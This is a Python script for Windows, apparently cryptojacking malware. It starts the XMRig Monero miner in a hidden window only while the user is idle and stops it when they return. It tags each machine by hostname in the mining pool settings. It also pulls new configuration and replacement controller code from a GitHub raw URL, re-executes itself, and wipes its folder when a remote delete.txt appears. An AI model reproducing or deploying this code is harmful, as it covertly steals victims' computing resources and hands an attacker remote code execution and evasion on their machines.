#!/usr/bin/env python3
import os
import shutil
import subprocess
import time
import psutil
import ctypes
import json
from datetime import datetime
import socket
import hashlib
import requests
import sys

# ============================================================
# 
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOCALAPP = os.getenv("LOCALAPPDATA") or os.path.expanduser("~")
SAFE_DIR = os.path.join(LOCALAPP, "SystemController")

CONFIG_FILE = os.path.join(BASE_DIR, "config_high.json")
INJECTED_CFG = os.path.join(BASE_DIR, "config_injected.json")
LOG_FILE = os.path.join(BASE_DIR, "controller.log")
WALLET_FILE = os.path.join(BASE_DIR, "wallet.txt")

# 
GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/config_high.json"
GITHUB_CONTROLLER_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/controller.py"
GITHUB_DELETE_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/delete.txt"

GITHUB_UPDATE_INTERVAL = 150  # 5 minutes
_last_update = 0

IDLE_THRESHOLD = 30  # seconds idle before mining
HOSTNAME = socket.gethostname()

# Miner executable info
XM_EXE = os.path.join(BASE_DIR, "xmrig.exe")
XM_LOG = os.path.join(BASE_DIR, "miner_xmrig.log")

# ============================================================
# LOGGING
# ============================================================

def log(msg):
    stamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(stamp + msg + "\n")
    except:
        pass
    print(stamp + msg)

# ============================================================
# UTILITIES
# ============================================================

def sha256_bytes(data):
    try:
        return hashlib.sha256(data).hexdigest()
    except:
        return None

def sha256_file(path):
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

def get_idle_seconds():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint),
                    ("dwTime", ctypes.c_ulong)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(lii)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0

def load_wallet():
    try:
        with open(WALLET_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        log("[ERROR] wallet.txt missing or unreadable")
        return None

# ============================================================
# GITHUB UPDATER
# ============================================================

def pull_github_updates():

    global _last_update
    now = time.time()

    if now - _last_update < GITHUB_UPDATE_INTERVAL:
        return False
    _last_update = now

    log("[UPDATE] Checking GitHub for updates...")

    # --------------------------------------------------------
    # 1. 
    # --------------------------------------------------------
    try:
        r = requests.get(GITHUB_DELETE_URL, timeout=10)
        if r.status_code == 200:
            log("[SELF-DESTRUCT] delete.txt detected—removing folder")
            try:
                shutil.rmtree(SAFE_DIR)
            except Exception as e:
                log(f"[SELF-DESTRUCT ERROR] {e}")
            os._exit(0)
    except:
        pass

    cfg_changed = False

    # --------------------------------------------------------
    # 2. UPDATE CONFIG
    # --------------------------------------------------------
    try:
        old_hash = sha256_file(CONFIG_FILE)

        r = requests.get(GITHUB_CONFIG_URL, timeout=10)
        if r.status_code == 200:
            new_bytes = r.content
            if sha256_bytes(new_bytes) != old_hash:
                with open(CONFIG_FILE, "wb") as f:
                    f.write(new_bytes)
                cfg_changed = True
                log("[UPDATE] config_high.json updated")
            else:
                log("[UPDATE] config_high.json already latest")
        else:
            log(f"[UPDATE] config_high.json not found (HTTP {r.status_code}) — ignoring")

    except Exception as e:
        log(f"[ERROR] config update failed: {e}")

    # --------------------------------------------------------
    # 3. UPDATE
    # --------------------------------------------------------
    try:
        r = requests.get(GITHUB_CONTROLLER_URL, timeout=10)


        if r.status_code == 200 and len(r.content) > 50:

            remote_hash = sha256_bytes(r.content)
            local_hash = sha256_file(os.path.join(BASE_DIR, "controller.py"))

            if local_hash != remote_hash:
                log("[UPDATE] controller.py updated from GitHub")

                with open(os.path.join(BASE_DIR, "controller.py"), "wb") as f:
                    f.write(r.content)

                log("[UPDATE] Restarting controller to apply update...")
                os.execv(sys.executable, [sys.executable, os.path.join(BASE_DIR, "controller.py")])

        else:
            log("[UPDATE] controller.py missing or invalid on GitHub — skipping safe")

    except Exception as e:
        log(f"[ERROR] controller update failed: {e}")

    return cfg_changed

# ============================================================
# MINER START / STOP
# ============================================================

def start_xmrig():
    wallet = load_wallet()
    if not wallet:
        log("[ERROR] Cannot start XMRig — no wallet.")
        return None

    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception as e:
        log(f"[ERROR] Failed to read {CONFIG_FILE}: {e}")
        return None

    # Inject
    try:
        cfg["pools"][0]["user"] = cfg["pools"][0]["user"].replace("__WALLET__", wallet)
        cfg["pools"][0]["pass"] = HOSTNAME
    except Exception as e:
        log(f"[ERROR] Failed injecting wallet/hostname: {e}")
        return None

    try:
        with open(INJECTED_CFG, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        log(f"[ERROR] Failed writing config_injected.json: {e}")
        return None

    cmd = [XM_EXE, "-c", INJECTED_CFG]
    log(f"[DEBUG] Launching XMRig: {cmd}")

    try:
        return subprocess.Popen(
            cmd,
            stdout=open(XM_LOG, "a", encoding="utf-8"),
            stderr=subprocess.STDOUT,
            creationflags=0x08000000,
            cwd=BASE_DIR
        )
    except Exception as e:
        log(f"[ERROR] Failed to launch XMRig: {e}")
        return None

def stop_proc(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            log("Did not stop on time - killing")
            proc.kill()

def read_hashrate():
    try:
        with open(XM_LOG, "rb") as f:
            f.seek(-2048, os.SEEK_END)
            for line in f.readlines()[::-1]:
                if b"speed 10s" in line:
                    return line.decode(errors="ignore").strip()
    except:
        pass
    return "OFF"

# ============================================================
# MAIN LOOP
# ============================================================

def main():
    xmrig_proc = None
    xmrig_mode = "off"

    log("Controller started (Idle-only mining, Windows version)")

    # 
    if pull_github_updates():
        log("[RESTART] Updated config, restarting XMRig")
        xmrig_proc = start_xmrig()
        xmrig_mode = "on"

    while True:
        idle = get_idle_seconds()
        cpu = psutil.cpu_percent(interval=1)
        idle_state = idle > IDLE_THRESHOLD

        # Start when idle
        if idle_state and xmrig_mode == "off":
            xmrig_proc = start_xmrig()
            xmrig_mode = "on"
            log("[XMRIG] Started (IDLE mode HIGH)")

        # Stop when active
        if not idle_state and xmrig_mode == "on":
            stop_proc(xmrig_proc)
            xmrig_proc = None
            xmrig_mode = "off"
            log("[XMRIG] Stopped (ACTIVE USE)")

        # Restart crashed
        if xmrig_proc and xmrig_proc.poll() is not None:
            log("[XMRIG] crashed → restarting")
            xmrig_proc = start_xmrig()

        # Periodic updates
        if pull_github_updates():
            log("[RESTART] Updated config, restarting XMRig")
            stop_proc(xmrig_proc)
            xmrig_proc = start_xmrig()
            xmrig_mode = "on"

        # Status log
        hashrate = read_hashrate() if xmrig_mode == "on" else "OFF"
        log(f"CPU={cpu}%  IDLE={int(idle)}s  XMRIG={hashrate}")

        time.sleep(2)

# ============================================================
# ENTRY
# ============================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Controller stopped by user.")
